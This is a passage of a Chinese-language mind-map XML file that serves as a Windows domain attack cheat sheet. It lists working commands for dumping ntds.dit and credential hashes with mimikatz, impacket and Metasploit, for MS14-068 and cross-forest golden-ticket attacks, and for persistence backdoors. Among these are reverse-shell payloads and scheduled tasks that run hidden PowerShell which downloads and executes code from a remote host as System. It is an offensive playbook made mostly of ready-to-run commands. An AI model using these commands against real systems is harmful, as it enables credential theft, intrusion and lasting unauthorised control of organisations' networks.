            <node TEXT="ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q" ID="3a41736c42c8eb081" STYLE="fork"/>
          </node>
          <node TEXT="将ntds.dit文件拷走后删除test文件夹：rmdir /s /q test" ID="6e1736c43e8ba194" STYLE="fork"/>
          <node TEXT="Nishang中的Copy-VSS.ps1脚本，可以将SAM\SYSTEM\ntds.dit复制到当前目录" ID="571736c45baf415c" STYLE="fork">
            <node TEXT="Import-Modult .\Copy-VSS.ps1" ID="1241736c464f2c0b1" STYLE="fork"/>
            <node TEXT="Copy-VSS" ID="d01736c467afb108" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="使用diskshadow导出ntds.dit" ID="2061736c46d393095" STYLE="fork">
          <node TEXT="执行命令" ID="d1736c47107b0bc" STYLE="fork">
            <node TEXT="将exec c:\windows\system32\calc.exe写入test.txt中，执行diskshadow.exe /s test.txt即会执行文本中的命令" ID="3d61736c48ceb3042" STYLE="fork"/>
          </node>
          <node TEXT="导出ntds.dit" ID="3831736c4a979b137" STYLE="fork">
            <node TEXT="将以下命令写入文本文件c:\command.txt" ID="551736c4ab274111" STYLE="fork">
              <node TEXT="set context persistent nowriters" ID="2181736c4b2cec137" STYLE="fork"/>
              <node TEXT="add volume c: alias someAlias" ID="1a1736c4b53a30b4" STYLE="fork"/>
              <node TEXT="create" ID="1ba1736c4b84fb179" STYLE="fork"/>
              <node TEXT="expose %someAlias% k:" ID="3c91736c4b8ff307f" STYLE="fork"/>
              <node TEXT="exec &quot;cmd.exe&quot; /c copy k:\windows\ntds\ntds.dit c:\ntds.dit" ID="421736c4bc81d0a2" STYLE="fork"/>
              <node TEXT="delete shadows all" ID="2cb1736c4c546b0ae" STYLE="fork"/>
              <node TEXT="listshadows all" ID="2fd1736c4c664213b" STYLE="fork"/>
              <node TEXT="reset" ID="2ec1736c4c7b6c02f" STYLE="fork"/>
              <node TEXT="exit" ID="1fb1736c4c84a409e" STYLE="fork"/>
            </node>
            <node TEXT="执行命令diskshadow.exe /s c:\command.txt时必须将shell路径切换至c:\windows\system32目录下" ID="701736c4c8a8b02e" STYLE="fork"/>
          </node>
          <node TEXT="导出ntds.dit文件后需要将system转储 [system.hive中存放着ntds.dit的密钥]" ID="1991736c4d77a30b1" STYLE="fork">
            <node TEXT="reg save hklm\system c:\windows\temp\system.hive" ID="bf1736c4e1e7b186" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="导出ntds.dit中的hash" ID="461736c4f28ea05b" STYLE="fork">
        <node TEXT="使用esedbexport恢复hash[下载地址：https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz]" ID="2761736c4f55f403f" STYLE="fork">
          <node TEXT="提取表：esedbexport -m tables ntds.dit [两个重要的表为：datatable以及link_table，他们都会被存放在./ntds.dit.export/文件夹中]" ID="5c1736c4fa203033" STYLE="fork"/>
          <node TEXT="ntdsxtract提取域中信息：dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive systemhive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt [下载地址：https://github.com/csababarta/ntdsxtract]" ID="3de1736c546da404f" STYLE="fork"/>
          <node TEXT="提取计算机信息及其它信息：dscomputers.py ntds.dit.export/datatable.3 computer_output --csvoutfile all_computers.csv" ID="14b1736c56c72b08c" STYLE="fork"/>
        </node>
        <node TEXT="使用impacket工具包导出hash" ID="2931736c577904147" STYLE="fork">
          <node TEXT="impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL " ID="871736c57aa13095" STYLE="fork"/>
          <node TEXT="impacket还可以通过帐户、哈希进行身份验证从远程域控中读取ntds.dit并转储" ID="3be1736c5a721a0a9" STYLE="fork">
            <node TEXT="impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc$@10.0.0.1 " ID="1c81736c5b36f2009" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="在Windows下解析ntds.dit并导出hash" ID="1511736c5b7d9a12d" STYLE="fork">
          <node TEXT="ntdsdumpex.exe -d ntds.dit -s system" ID="3041736c5bcb4a0c6" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="利用dcsync获取域hash" ID="ef1736c5c8e9316d" STYLE="fork">
        <node TEXT="使用mimikatz转储域hash" ID="1821736c5cb883086" STYLE="fork">
          <node TEXT="lsadump::dcsync /domain:pentest.com /all /csv [需先执行privilege::debug命令，并加上log]" ID="21736c5d190b111" STYLE="fork"/>
        </node>
        <node TEXT="使用Invoke-DCSync.ps1获取域hash" ID="1e91736c5e1a4b195" STYLE="fork">
          <node TEXT="powershell.exe -exec bypass -command &quot;&amp; {Import-Module .\invoke-dcsync.ps1;invoke-dcsync -PWDumpFormat}&quot;" ID="1ea1736c5e8033016" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="使用Metasploit获取域hash" ID="1621736c5f8c2b0b6" STYLE="fork">
        <node TEXT="使用psexec_ntdsgrab 模块" ID="3ca1736c61ac0b0ca" STYLE="fork">
          <node TEXT="use auxiliary/admin/smb/psexec_ntdsgrab   配置rhost\smbdomain\smbuser\smbpass" ID="1971736c5fbb3315" STYLE="fork"/>
        </node>
        <node TEXT="基于meterpreter会话" ID="71736c617433143" STYLE="fork">
          <node TEXT="use windows/gather/credentials/domain_hashdump 配置meterpreter会话ID" ID="681736c619cda167" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="使用vshadow.exe和quarkspwdump.exe导出域hash" ID="33c1736c628be30f5" STYLE="fork">
        <node TEXT="将三个工具传到目标服务器同一目录下：vshadow.exe + ShadowCopy.bat + QuarksPwDump.exe" ID="32e1736c635cbb0bc" STYLE="fork"/>
        <node TEXT="以管理员权限运行ShadowCopy.bat脚本,之后提取的ntds.dit会被复制到当前目录,利用esentutl工具修复ntds.dit文件" ID="35c1736c66e47b03a" STYLE="fork">
          <node TEXT="esentutl /p /o ntds.dit" ID="1ef1736c66ecc3197" STYLE="fork"/>
        </node>
        <node TEXT="利用QuarksPwDump 读取修复后的ntds.dit文件,导出域内所有账户hash" ID="2211736c66ff73015" STYLE="fork">
          <node TEXT="reg save hklm\system system.hive" ID="a01736c672ee215e" STYLE="fork"/>
          <node TEXT="QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive -o c:\res.txt" ID="3bb1736c676b3b12" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="Kerberos域用户提权[MS14-068]" ID="1341736f30433a02c" STYLE="fork">
        <node TEXT="pyKEK工具包[下载地址：https://technet.microsoft.com/library/security/ms14-068 ]" ID="26e1736f3066430ec" STYLE="fork">
          <node TEXT="查看当前域用户的SID：whoami /all" ID="2881736f318a710e" STYLE="fork"/>
          <node TEXT="生成高权限票据：python ms14-068.py -u 用户名@域名 -s 域用户SID -d 域控IP -p 域用户密码【python ms-14-068.py -u user1@pentest.com -s S-1-5-21-31112629480-1751665795-4063538595-1104 -d 172.16.86.130 -p Aa123456】" ID="2fa1736f52c4e90a4" STYLE="fork"/>
          <node TEXT="清除内存中的所有票据：打开mimikatz，kerberos::purge 当看到Ticket purge for current session is OK时表示清除成功" ID="29d1736f5c2ed2041" STYLE="fork"/>
          <node TEXT="将高权限票据注入内存：打开mimikatz,输入kerberos::ptc &quot;TGT_user1@pentest.com.cache&quot; 看到Injecting ticket : OK表示 注入成功" ID="1611736f5e55ca0e8" STYLE="fork"/>
          <node TEXT="验证权限：dir \\dc\c$ [net user \\dc\ipc$][使用IP连接可能会失败，故使用计算机名]" ID="451736f73ed4f11e" STYLE="fork"/>
        </node>
        <node TEXT="goldenPac.py" ID="1dc1736f74b9f90c" STYLE="fork">
          <node TEXT="python goldenPac.py 域名/域用户名:域用户密码@域控服务器" ID="3691736f74d019184" STYLE="fork"/>
          <node TEXT="kali中需要安装依赖：apt-get install -y krb5-user" ID="1161736f76d44215c" STYLE="fork"/>
        </node>
        <node TEXT="Metasploit" ID="11c1736f77ce48172" STYLE="fork">
          <node TEXT="use auxiliary/admin/kerberos/ms14_068_kerberos_checksum  配置域名、域用户/密码/SID 执行exploit后，会生成bin文件" ID="ae1736f77dbe0066" STYLE="fork"/>
          <node TEXT="mimikatz导出kirbi格式文件：kerberos::clist &quot;20141223201326_default_172.16.158.135_windows.kerberos_194320.bin&quot; /export" ID="1cf1736f7a443917c" STYLE="fork"/>
          <node TEXT="msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.86.135 LPORT=4444 -f exe &gt; shell.exe 执行后，获取meterpreter权限 " ID="18b17370017b09025" STYLE="fork"/>
          <node TEXT="执行命令getuid应该是user1/pentest.com权限 ，执行命令load kiwi 然后再输入kerberos_ticket_use /tmp/0-00000000-user1@krbtgt-pentest.com.kirbi导入票据" ID="22e173700381c2089" STYLE="fork"/>
          <node TEXT="再输入background切换到meterpreter后台，获取后台session会话id" ID="1e51737004d97403e" STYLE="fork"/>
          <node TEXT="use exploit/windows/local/current_user_psexec  [set TECHNIQUE PSH][set RHOSTS WIN-F46QAN3U3UH.pentest.com][set payload windows/meterpreter/reverse_tcp][set lhost 172.16.86.135][set SESSION 1][exploit] " ID="3051737005b85b0e1" STYLE="fork"/>
        </node>
      </node>
    </node>
    <node TEXT="七、跨域攻击[看这篇吧：https://www.cnblogs.com/micr067/p/12984136.html]" ID="3271735a6aed8c0ba" STYLE="bubble" POSITION="left">
      <node TEXT="利用域信任关系的跨域攻击 " ID="23e173700838c2122" STYLE="fork">
        <node TEXT="域信息关系" ID="1617370087c7a124" STYLE="fork">
          <node TEXT="单向信任：在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问流。在受信任域和信任域之间的单向信任中，受信任域内的用户可以访问信任域内的资源。" ID="13717370088c4a037" STYLE="fork"/>
          <node TEXT="双向信任：指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问流，活动目录中的所有域信任关系都是双向可传递的。" ID="1ba173702bf54a11f" STYLE="fork"/>
          <node TEXT="默认情况下，使用活动目录安装向导将新域添加到域权或林根域中，会自动创建双向可传递信任" ID="23217370364ce1057" STYLE="fork"/>
          <node TEXT="外部信任：是指两个不同林中的域的信任关系，外部信任是不可传递的。" ID="3e71737036eaf9149" STYLE="fork"/>
        </node>
        <node TEXT="获取 域信息[lg.exe]" ID="385173703755f911c" STYLE="fork">
          <node TEXT="枚举lab域中的用户组：lg.exe lab\." ID="6417370376ce8032" STYLE="fork"/>
          <node TEXT="枚举远程机器 的本地组用户：lg.exe \\dc -lu" ID="264173703aadf1127" STYLE="fork"/>
          <node TEXT="枚举所有用户的SID： lg.exe \\dc -lu -sidsout" ID="12d17370452c28098" STYLE="fork"/>
        </node>
        <node TEXT="利用域信任密钥获取 目标域的权限" ID="3ba17370470a29042" STYLE="fork">
          <node TEXT="场景描述" ID="3817370473b5807b" STYLE="fork">
            <node TEXT="父域域控：dc.test.com" ID="225173704bff4909a" STYLE="fork"/>
            <node TEXT="子域域控：sub.test.com" ID="9f173704c2f50144" STYLE="fork"/>
            <node TEXT="子域计算机：pc.sub.test.com" ID="2c7173704c56350ca" STYLE="fork"/>
            <node TEXT="子域用户：sub\test" ID="99173704dd2d10d2" STYLE="fork"/>
          </node>
          <node TEXT="在子域域控上执行mimikatz.exe privilege::debug &quot;lsadump::lsa /patch /user:tset$&quot; &quot;lsadump::trust /patch&quot; exit" ID="73173704df4f8107" STYLE="fork"/>
          <node TEXT="创建信任票据:mimikatz &quot;kerberos::golden /domain:sub.test.com /sid:S-1-5-21-3286823404-654603728-2254694439 /sids:S-1-5-21-1150252187-1650404275-3011793806-519 /rc4:f430c584462c52bc2291fea8705031c5 /user:DarthVader /service:krbtgt /target:test.com /ticket:payload.kiribi&quot; exit" ID="10617370530de9009" STYLE="fork"/>
          <node TEXT="利用刚刚创建的payload.kiribi的信任票据获取目标域中目标服务的TGS并保存到文件中:Asktgs payload.kiribi CIFS/dc.test.com" ID="1ec17370595be9135" STYLE="fork"/>
          <node TEXT="将获取的TGS票据注入内存：kiribikator lsa CIFS.dc.test.com.kiribi" ID="30a173705a257114d" STYLE="fork"/>
          <node TEXT="访问目标服务:dir \\dc.test.com\c$" ID="33f173705abc4018d" STYLE="fork"/>
        </node>
        <node TEXT="利用krbtgt hash获取目标域权限 " ID="2a3173705b35b0124" STYLE="fork">
          <node TEXT="在域控上获取krbtgt hash" ID="35e173705b84b00b4" STYLE="fork">
            <node TEXT="mimikatz privilege::debug &quot;lsadump::lsa /patch /user:krbtgt&quot; sekurlsa::krbtgt exit" ID="f8173705be48f0cb" STYLE="fork"/>
          </node>
          <node TEXT="在子域内的计算机上（pc.sub.test.com）上使用普通用户权限（sub\test）构造并注入黄金票据，获取目标域的权限" ID="3571737060a510199" STYLE="fork">
            <node TEXT="mimikatz &quot;kerberos::golden /user:administrator /domain:selas.payload.com /sid:S-1-5-21-3286823404-654603728-2254694439 /sids:S-1-5-21-1150252187-1650404275-3011793806-519 /krbtgt:ffc79c6f14bb2c39e6ceab183cefc9c5 /ptt&quot; exit" ID="29c173706284800ae" STYLE="fork"/>
          </node>
          <node TEXT="访问目标服务:dir \\dc.test.com\c$" ID="29d17370647c40001" STYLE="fork"/>
        </node>
        <node TEXT="外部信任和林信任" ID="c717370668120132" STYLE="fork">
          <node TEXT="利用信任关系获取信任域的信息" ID="1621737066ad2803" STYLE="fork">
            <node TEXT="adfind -h payload.com -sc u:administrator" ID="3c717370681c1017a" STYLE="fork"/>
          </node>
          <node TEXT="使用powerview定位敏感用户" ID="339173706866c1024" STYLE="fork">
            <node TEXT=".\powerview.ps1" ID="3c417370686c78042" STYLE="fork"/>
            <node TEXT="Get-DomainForeignGroupMember -Domain payload.com" ID="3e5173706893180fc1" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="利用无约束委派和MS-RPRN获取信任林权限" ID="130173706902a8064" STYLE="fork">
          <node TEXT="使用rubeus工具，监控身份认证请求" ID="35f173706a4bb80a8" STYLE="fork">
            <node TEXT="rubeus.exe monitor /interval:5 /filteruser:BDC$" ID="2f9173706a56810ac" STYLE="fork"/>
          </node>
          <node TEXT="开启监听后，在命令行环境下执行如下命令，使用SpoolSample工具让目标域控制器bcd.b.com向dc.a.com发送身份认证请求" ID="255173706aafb8003" STYLE="fork">
            <node TEXT="SpoolSample.exe bdc.b.com dc.a.com" ID="201173706ab7000b1" STYLE="fork"/>
          </node>
          <node TEXT="rubeus会捕获来自bdc.b.com的认证请求，保存其中的TGT数据。清除TGT数据文件中多余的换行符，然后使用rubeus工具将票据注入内存" ID="390173706ad8c9126" STYLE="fork">
            <node TEXT="Rubeus.exe ptt /ticket:&lt;TGT 数据&gt;" ID="9173706e2d770a5" STYLE="fork"/>
          </node>
          <node TEXT="使用mimikatz获取目标域的krbtgt散列值。使用mimikatz的dcsync功能，模拟域控制器向目标域控制器发送请求（获取账户密码）" ID="241173706e47a003c" STYLE="fork">
            <node TEXT="mimikatz &quot;lsadump::dcsync /domain:b.com /user:b\krbtgt&quot; exit" ID="e4173706e704116b" STYLE="fork"/>
          </node>
          <node TEXT="构造黄金票据并将其注入内存，获取目标域控制器的权限" ID="81173706e8e2106a" STYLE="fork">
            <node TEXT="mimikatz &quot;kerberos::golden /user:administrator /domain:b.com /sid: /rc4: /ptt&quot; exit" ID="60173706ea351148" STYLE="fork"/>
          </node>
          <node TEXT="最后访问目标服务" ID="1c0173706eb4df0f4" STYLE="fork">
            <node TEXT="dir \\bdc.com\c$" ID="1c4173706eeb7007c" STYLE="fork"/>
          </node>
        </node>
      </node>
    </node>
    <node TEXT="八、权限维持" ID="1501735a6b136316c" STYLE="bubble" POSITION="left">
      <node TEXT="操作系统后门" ID="37173707072f0097" STYLE="fork">
        <node TEXT="粘滞键后门" ID="2c817370708d2002a" STYLE="fork">
          <node TEXT="命令行" ID="29017370716e2218c" STYLE="fork">
            <node TEXT="cd c:\windows\system32" ID="24817370718038144" STYLE="fork"/>
            <node TEXT="move sethc.exe sethc.exe.bak" ID="5e1737071a470029" STYLE="fork"/>
            <node TEXT="copy cmd.exe sethc.exe" ID="3671737071c530108" STYLE="fork"/>
          </node>
          <node TEXT="Empire" ID="2461737071e578187" STYLE="fork">
            <node TEXT="usemodule lateral_movement/invoke_wmi_debuggerinfo" ID="3011737071fb2008d" STYLE="fork"/>
            <node TEXT="set Listener  shuteer" ID="2441737073507902a" STYLE="fork"/>
            <node TEXT="set ComputerName  WIN7-64.shuteer.testlab" ID="2173707350791481" STYLE="fork"/>
            <node TEXT="set TargetBinary sethc.exe" ID="118173707350790bd2" STYLE="fork"/>
            <node TEXT="execute" ID="93173707350790633" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="注册表后门" ID="3351737074b45000e" STYLE="fork">
          <node TEXT="Empire" ID="aa1737074d20816d" STYLE="fork">
            <node TEXT="usemodule persistence/userland/registry" ID="2b817370750a19114" STYLE="fork"/>
            <node TEXT="set Listener shuteer" ID="220173707533c013d" STYLE="fork"/>
            <node TEXT="set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run" ID="17c173707541b61841" STYLE="fork"/>
            <node TEXT="execute" ID="126173707541b61172" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="计划任务后门" ID="3261737075e0e0122" STYLE="fork">
          <node TEXT="基本命令：schtasks /create /tn updater /tr notepad.exe /sc hourly /mo 1  [每小时执行一次notepad]" ID="2e31737078a5e804a" STYLE="fork"/>
          <node TEXT="Empire" ID="c11737075f8b00b" STYLE="fork">
            <node TEXT="usemodule persistence/elevated/schtasks" ID="1e217370762148082" STYLE="fork"/>
            <node TEXT="Set DailyTime 16:17" ID="29c173707758c8009" STYLE="fork"/>
            <node TEXT="Set Listener test" ID="2b8173707759cf0411" STYLE="fork"/>
            <node TEXT="execute" ID="dc173707759cf0ea2" STYLE="fork"/>
          </node>
          <node TEXT="Metasploit" ID="b617370786320067" STYLE="fork">
            <node TEXT="托管和生成各种格式" ID="249173707c44b90d4" STYLE="fork">
              <node TEXT="use exploit/multi/script/web_delivery" ID="151173707be34f149" STYLE="fork"/>
              <node TEXT="set payload windows/x64/meterpreter/reverse_tcp" ID="18e173707be34f18a1" STYLE="fork"/>
              <node TEXT="set LHOST 10.0.2.21" ID="8d173707be34f0ad2" STYLE="fork"/>
              <node TEXT="set target 5" ID="196173707be34f0263" STYLE="fork"/>
              <node TEXT="exploit" ID="265173707be34f0de4" STYLE="fork"/>
            </node>
            <node TEXT="系统启动时" ID="1ad173707c00b818b" STYLE="fork">
              <node TEXT="【x64】schtasks /create /tn PentestLab /tr &quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &apos;IEX ((new-object net.webclient).downloadstring(&apos;&apos;http://10.0.2.21:8080/ZPWLywg&apos;&apos;&apos;))&apos;&quot; /sc onstart /ru System" ID="1a173707cc1e80bd" STYLE="fork"/>
              <node TEXT="【x86】schtasks /create /tn PentestLab /tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &apos;IEX ((new-object net.webclient).downloadstring(&apos;&apos;http://10.0.2.21:8080/ZPWLywg&apos;&apos;&apos;))&apos;&quot; /sc onstart /ru System" ID="250173707dd438111" STYLE="fork"/>
            </node>
            <node TEXT="用户登陆时" ID="35c173707cea48192" STYLE="fork">
              <node TEXT="schtasks /create /tn PentestLab /tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &apos;IEX ((new-object net.webclient).downloadstring(&apos;&apos;http://10.0.2.21:8080/ZPWLywg&apos;&apos;&apos;))&apos;&quot; /sc onlogon /ru System" ID="d7173707d1aa8129" STYLE="fork"/>
            </node>
          </node>
          <node TEXT="PowerSploit" ID="e7173707eb4a7068" STYLE="fork">
            <node TEXT="$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -Hourly" ID="36b17370817538156" STYLE="fork"/>
            <node TEXT="$UserOptions = New-UserPersistenceOption -ScheduledTask -Hourly" ID="2df173708179581121" STYLE="fork"/>
            <node TEXT="Add-Persistence -FilePath C:\temp\empire.exe -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions" ID="ae173708179581732" STYLE="fork"/>
          </node>
          <node TEXT="meterpreter" ID="1b6173708244a0083" STYLE="fork"/>
          <node TEXT="Cymothoa" ID="37017370825588041" STYLE="fork"/>
          <node TEXT="WMI" ID="31117370826a3804d" STYLE="fork">
            <node TEXT="Empire  Invoke-WMI" ID="f11737082ccd0084" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="Web后门" ID="30317370847f0805f" STYLE="fork">
        <node TEXT="Nishang下的webshell" ID="1fa17370848ff0122" STYLE="fork"/>
        <node TEXT="weevely" ID="271737087970f15a" STYLE="fork"/>
        <node TEXT="webacoo" ID="1bb1737088676e114" STYLE="fork"/>
        <node TEXT="meterpreter webshell" ID="34b1737087bc18122" STYLE="fork"/>
      </node>
      <node TEXT="域控权限持久化" ID="2a1737089366f0b5" STYLE="fork">
        <node TEXT="DSRM域后门" ID="1a17370895c4f131" STYLE="fork">
          <node TEXT="使用mimikatz查看krbtgt的NTLM hash" ID="398173708a59b016a" STYLE="fork">
            <node TEXT="privilege::debug" ID="ee173708eb9d8174" STYLE="fork"/>
            <node TEXT="lsadump::lsa /patch /name:krbtgt" ID="234173708fac87092" STYLE="fork"/>
          </node>
          <node TEXT="使用mimikatz读取SAM中本地管理员的NTLM Hash" ID="1be173708ed96f179" STYLE="fork">
            <node TEXT="privilege::debug" ID="77173708f395f0bb" STYLE="fork"/>
            <node TEXT="token::elevate" ID="1b5173708f7c0d0ee1" STYLE="fork"/>
            <node TEXT="lsadump::sam" ID="2c9173708f7c0d15d2" STYLE="fork"/>
          </node>
          <node TEXT="将DRSM帐号和krbtgt的NTLM Hash同步" ID="b1173709007d0095" STYLE="fork">
            <node TEXT="ntdsutil" ID="2801737090856708c" STYLE="fork"/>
            <node TEXT="set dsrm password" ID="2281737090fbef178" STYLE="fork"/>
            <node TEXT="sync from domain account krbtgt" ID="3c81737091a917173" STYLE="fork"/>
            <node TEXT="q" ID="1a7173709165e802b" STYLE="fork"/>
            <node TEXT="q" ID="2c117370916947142" STYLE="fork"/>
          </node>
          <node TEXT="查看DSRM的NTLM Hash是否同步成功" ID="ea1737091dca718f" STYLE="fork">
            <node TEXT="lsadump::sam[NTLM Hash与第一步Hash值 相同]" ID="2de17370921e40074" STYLE="fork"/>
          </node>
          <node TEXT="修改DSRM登陆方式" ID="2e81737092b81002d" STYLE="fork">
            <node TEXT="New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD" ID="3651737092da5016" STYLE="fork"/>
          </node>
          <node TEXT="使用本地administrator帐号PTH攻击域控" ID="33c17370933a70164" STYLE="fork">
            <node TEXT="privilege::Debug" ID="1c11737093e87705c" STYLE="fork"/>
            <node TEXT="sekurlsa::pth /domain:WIN2008 /user:administrator /ntlm:51b7f7dca9302c839e48d039ee37f0d1" ID="3251737093fa0f17a1" STYLE="fork"/>
          </node>
          <node TEXT="使用mimikatz的dcysnc功能远程转储krbtgt" ID="29c17370942410035" STYLE="fork">
            <node TEXT="lsadump::dcsync /domain:pentest.com /dc:dc /user:krbtgt" ID="4a17370946360062" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="SSP维持权限" ID="817370959b370a2" STYLE="fork"/>
        <node TEXT="SID HISTORY后门" ID="361737095f098113" STYLE="fork"/>
        <node TEXT="Golden Ticket" ID="25c17370961977034" STYLE="fork"/>
        <node TEXT="Silver Ticket" ID="3aa1737096612f0db" STYLE="fork"/>
        <node TEXT="Skeleton Key" ID="7d17370969b8f04" STYLE="fork"/>
        <node TEXT="HOOK PasswordChangeNotify" ID="2c61737097185a11c" STYLE="fork"/>
      </node>
      <node TEXT="Nishang下的脚本后门" ID="2261737097a9200d" STYLE="fork">
        <node TEXT="HTTP-Backdoor" ID="2c81737097c17f169" STYLE="fork"/>
        <node TEXT="Add-ScrnSaveBackdoor" ID="2e01737097d54000b" STYLE="fork"/>
        <node TEXT="Execute-Ontime" ID="28c1737098875711b" STYLE="fork"/>
        <node TEXT="Invoke-ADSbackdoor" ID="1491737098a4280a2" STYLE="fork"/>
      </node>
    </node>
    <node TEXT="九、CS" ID="32a1735a6b2072186" STYLE="bubble" POSITION="left"/>
  </node>
</map>